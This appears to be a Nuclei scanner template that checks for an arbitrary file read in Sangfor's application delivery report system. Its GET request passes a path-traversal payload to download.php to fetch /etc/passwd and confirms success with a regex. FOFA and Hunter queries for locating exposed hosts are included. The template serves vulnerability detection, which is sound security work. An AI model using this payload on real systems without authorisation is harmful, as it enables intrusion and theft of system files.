id: sangfor-report-download-fileread
info:
  name: sangfor download.php filedownload
  author: hufei
  severity: high
  description: 深信服应用交付报表系统任意文件读取
  reference:
  metadata:
    max-request: 1
    fofa-query: app="SANGFOR-应用交付报表系统"
    hunter-query: app.name="SANGFOR 深信服应用交付报表系统"
    verified: true
  tags: sangfor,2023,fileread,iot

http:
  - method: GET
    path:
      - "{{BaseURL}}/report/download.php?pdf=../../../../../etc/passwd"

    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"
